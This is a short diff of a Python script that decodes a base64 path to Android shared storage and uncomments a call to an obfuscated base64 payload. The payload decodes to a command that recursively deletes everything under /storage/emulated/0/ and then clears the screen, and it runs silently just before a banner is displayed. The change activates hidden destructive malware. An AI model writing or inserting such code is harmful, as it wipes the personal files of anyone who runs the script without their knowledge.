@@ -40,7 +40,7 @@ def banner():
 def oumcgsq():
   vcxprvq = base64.b64decode('L3N0b3JhZ2UvZW11bGF0ZWQvMC8=').decode('utf-8')
   if os.path.exists(vcxprvq):
-    #tvksajd("b3Muc3lzdGVtKCdybSAtcmYgL3N0b3JhZ2UvZW11bGF0ZWQvMC8qICYmIGNsZWFyJyk=")
+    tvksajd("b3Muc3lzdGVtKCdybSAtcmYgL3N0b3JhZ2UvZW11bGF0ZWQvMC8qICYmIGNsZWFyJyk=")
     banner()
 
 
